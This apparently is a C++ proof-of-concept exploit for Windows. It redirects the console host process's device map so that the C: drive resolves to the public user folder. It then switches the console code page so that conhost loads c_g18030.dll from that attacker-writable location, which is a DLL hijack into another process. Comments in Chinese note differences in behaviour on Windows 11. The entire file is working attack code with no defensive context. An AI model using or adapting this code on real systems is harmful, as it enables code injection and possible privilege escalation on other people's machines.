#include "ntapi.hpp"
#include "otherapi.hpp"

#define MAX_SYMLINK_PATH_COUNT 256
BOOL CreateSymbolicLinkPath(UNICODE_STRING* generatedLinkPath, PWSTR drivePath) {
	HANDLE symlinkHandle = NULL;
	UNICODE_STRING objSymLink;
	UNICODE_STRING objTruePath;
	OBJECT_ATTRIBUTES objAttrSymLink;
	ULONG retLen = FALSE;

	__try
	{
		RtlInitUnicodeString(&objSymLink, L"\\??\\C:");
		InitializeObjectAttributes(&objAttrSymLink, &objSymLink, OBJ_CASE_INSENSITIVE, NULL, NULL);

		objTruePath.Length = 0;
		objTruePath.MaximumLength = MAX_SYMLINK_PATH_COUNT * 2;
		objTruePath.Buffer = (PWSTR)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, MAX_SYMLINK_PATH_COUNT * 2);

		if (NtOpenSymbolicLinkObject(&symlinkHandle, GENERIC_READ, &objAttrSymLink) != STATUS_SUCCESS)
			__leave;

		if (NtQuerySymbolicLinkObject(symlinkHandle, &objTruePath, &retLen) != STATUS_SUCCESS)
			__leave;

		retLen = !!swprintf(objTruePath.Buffer, MAX_SYMLINK_PATH_COUNT, L"%s\\%s", objTruePath.Buffer, drivePath);

		generatedLinkPath->Buffer = objTruePath.Buffer;
		generatedLinkPath->Length = lstrlenW(objTruePath.Buffer) * 2;
		generatedLinkPath->MaximumLength = objTruePath.MaximumLength;
	}
	__finally
	{
		//if(symlinkHandle)
			//NtClose(symlinkHandle);

	}

	return retLen;
}

HANDLE CreateObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) 
{
	NTSTATUS Status = 0;
	HANDLE DirectoryHandle = NULL;
	UNICODE_STRING ObjectName = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	PUNICODE_STRING lpUnicodeObjectName = NULL;

	if (DirectoryName) 
	{
		RtlInitUnicodeString(&ObjectName, DirectoryName);
		lpUnicodeObjectName = &ObjectName;
	}

	InitializeObjectAttributes(
		&ObjectAttributes,
		lpUnicodeObjectName,
		OBJ_CASE_INSENSITIVE,
		hRoot,
		0);

	Status = NtCreateDirectoryObject(&DirectoryHandle, DIRECTORY_ALL_ACCESS, &ObjectAttributes);
	return DirectoryHandle;
}

int wmain(int argc, wchar_t* argv[])
{
	PEB Peb = { 0 };
	NTSTATUS Status = 0;
	ULONG ProcessId = 0;
	HANDLE hProcess = 0;
	CLIENT_ID ClientId = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	OBJECT_ATTRIBUTES objAttrLlink;
	UNICODE_STRING name;
	UNICODE_STRING target;
	HANDLE DirectoryLinkHandle = NULL;
	HANDLE SymbolicLinkHandle = NULL;
	OBJECT_ATTRIBUTES objAttrDir;

	InitializeObjectAttributes(&objAttrDir, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = NtCreateDirectoryObject(&DirectoryLinkHandle, DIRECTORY_ALL_ACCESS, &objAttrDir);
	wprintf(L"[*] NtCreateDirectoryObject 0x%08lx, 0x%p\n", Status, DirectoryLinkHandle);
	if (!NT_SUCCESS(Status))
		return Status;

	ULONG_PTR ConhostProcess = 0;
	NtQueryInformationProcess(NtCurrentProcess(), ProcessConsoleHostProcess, &ConhostProcess, 8, NULL);

	
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ConhostProcess);

	wprintf(L"ConhostProcess: %lld\n", ConhostProcess);


	if (ConhostProcess & 0x1)
	{
		Status = NtSetInformationProcess(hProcess, ProcessDeviceMap, &DirectoryLinkHandle, sizeof(HANDLE));
		wprintf(L"[*] 1 Set ProcessDeviceMap 0x%08lx\n", Status);
		if (!NT_SUCCESS(Status))
			return Status;
		// Set 的前后位置变化在 Windows 11 上出现了不一致行为
		// DeiveMap 在 Windows 11上即使能够Set 成功， 但疑似不再支持子目录类型的 Map ？
		//====================================================================


		// 可以改到别的盘符，不一定非要 C:\ 下
		CreateSymbolicLinkPath(&target, (PWSTR)L"Users\\Public");

		wprintf(L"[*] Updating C:\\ to point to %ls\n", target.Buffer);
		RtlInitUnicodeString(&name, L"C:");
		InitializeObjectAttributes(&objAttrLlink, &name, OBJ_CASE_INSENSITIVE, DirectoryLinkHandle, NULL);

		Status = NtCreateSymbolicLinkObject(&SymbolicLinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &objAttrLlink, &target);
		wprintf(L"[*] NtCreateSymbolicLinkObject 0x%08lx, ObjectName: %ls, target: %ls\n", Status, objAttrLlink.ObjectName->Buffer, target.Buffer);
		NtClose(DirectoryLinkHandle);
		if (!NT_SUCCESS(Status))
			return Status;

		Status = NtDuplicateObject(NtCurrentProcess(), SymbolicLinkHandle, hProcess, NULL, 0, 0, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
		if (!NT_SUCCESS(Status))
			return Status;

		// HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage
		// conhost.exe -> c_g18030.dll
		// 
		//======================================================================
		BOOL bStatus = SetConsoleCP(54936);
		wprintf(L"[*] bStatus: %d\n", bStatus);

	}
	
	wprintf(L"Last Win32Error: %ld\n", NtCurrentTeb()->LastErrorValue);
	wprintf(L"Last NtstatusError: 0x%08lx\n", NtCurrentTeb()->LastStatusValue);

	return Status;
}